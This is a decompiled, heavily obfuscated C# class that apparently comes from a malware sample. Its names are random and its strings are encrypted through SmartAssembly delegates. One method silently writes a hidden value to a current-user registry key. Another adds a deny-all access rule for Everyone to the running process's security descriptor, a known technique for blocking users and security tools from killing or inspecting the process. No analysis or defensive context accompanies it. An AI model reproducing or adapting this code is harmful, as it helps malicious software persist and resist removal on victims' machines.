using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace frgoWklvEOSV;

internal sealed class dDyurqCmIYO
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr OaApsaiJWBTboDYV, int GGYDxIzgOEHe, [Out] byte[] pcjIlFgZfJzCxk, uint egboQbWvdYUp, out uint vtuwIBfmZuHHB);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr FrcYMHQHnHUlB, int tVMHAivbcumDjO, [In] byte[] bVUUJPXRQqeQHa);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void iRhAYdJtRklx(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(PFruJiQrcriiZ.GwTsezEgVAuVAU(getString_0(107403392)));
			registryKey.SetValue(PFruJiQrcriiZ.GwTsezEgVAuVAU(getString_0(107403255)), getString_0(107404405));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor KJiAghXcDInbeBqcBB(IntPtr intptr_0)
	{
		byte[] pcjIlFgZfJzCxk = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, pcjIlFgZfJzCxk, 0u, out var vtuwIBfmZuHHB);
		if ((long)vtuwIBfmZuHHB > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, pcjIlFgZfJzCxk = new byte[vtuwIBfmZuHHB], vtuwIBfmZuHHB, out vtuwIBfmZuHHB))
		{
			return null;
		}
		return new RawSecurityDescriptor(pcjIlFgZfJzCxk, 0);
	}

	private void mIZccETANlKcj(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void snmtsQVthnGhgVm()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = KJiAghXcDInbeBqcBB(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			mIZccETANlKcj(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static dDyurqCmIYO()
	{
		Strings.CreateGetStringDelegate(typeof(dDyurqCmIYO));
	}
}
